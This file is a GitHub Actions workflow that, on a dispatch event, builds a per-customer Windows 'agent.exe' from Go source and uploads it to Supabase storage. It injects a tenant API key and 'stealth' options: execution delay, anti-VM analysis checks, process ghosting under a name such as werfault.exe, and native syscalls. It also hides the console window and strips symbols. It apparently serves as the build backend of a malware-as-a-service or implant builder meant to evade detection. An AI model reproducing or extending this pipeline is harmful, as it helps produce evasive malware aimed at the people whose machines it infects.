name: Build Agent Binary
on:
  repository_dispatch:
    types: [generate-agent]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.23'

      - name: Initialize and Tidy Module
        run: |
          if [ ! -f go.mod ]; then go mod init client-source; fi
          go mod tidy

      - name: Inject Stealth and Build
        run: |
          # 1. Inject the Tenant API Key
          sed -i "s/REPLACE_ME_API_KEY/${{ github.event.client_payload.api_key }}/g" client.go

          # 2. Extract Evasion Settings
          DELAY=${{ github.event.client_payload.stealth.delay || '0' }}
          ANTIVM=${{ github.event.client_payload.stealth.antiVM || 'false' }}
          GHOST=${{ github.event.client_payload.stealth.processGhost || 'werfault.exe' }}
          SYSCALLS=${{ github.event.client_payload.stealth.nativeSyscalls || 'true' }}

          # 3. Standard Go Build (Default Compiler)
          GOOS=windows GOARCH=amd64 go build \
            -ldflags="-s -w -H=windowsgui \
            -X main.ExecutionDelay=$DELAY \
            -X main.AntiAnalysis=$ANTIVM \
            -X main.GhostProcess=$GHOST \
            -X main.UseSyscalls=$SYSCALLS" \
            -o agent.exe .

      - name: Upload Binary to Supabase Storage
        run: |
          curl -fsS -X POST "${{ github.event.client_payload.supabase_url }}/storage/v1/object/builds/${{ github.event.client_payload.task_id }}.exe" \
            -H "Authorization: Bearer ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" \
            -H "Content-Type: application/octet-stream" \
            -H "x-upsert: true" \
            --data-binary @agent.exe

      - name: Mark build ready in Supabase
        if: success()
        run: |
          curl -fsS -X PATCH "${{ github.event.client_payload.supabase_url }}/rest/v1/build_history?build_id=eq.${{ github.event.client_payload.task_id }}" \
            -H "apikey: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" \
            -H "Authorization: Bearer ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" \
            -H "Content-Type: application/json" \
            -H "Prefer: return=minimal" \
            --data "{\"status\":\"ready\",\"completed_at\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

      - name: Mark build failed in Supabase
        if: failure()
        run: |
          curl -fsS -X PATCH "${{ github.event.client_payload.supabase_url }}/rest/v1/build_history?build_id=eq.${{ github.event.client_payload.task_id }}" \
            -H "apikey: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" \
            -H "Authorization: Bearer ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" \
            -H "Content-Type: application/json" \
            -H "Prefer: return=minimal" \
            --data "{\"status\":\"failed\",\"completed_at\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" || true
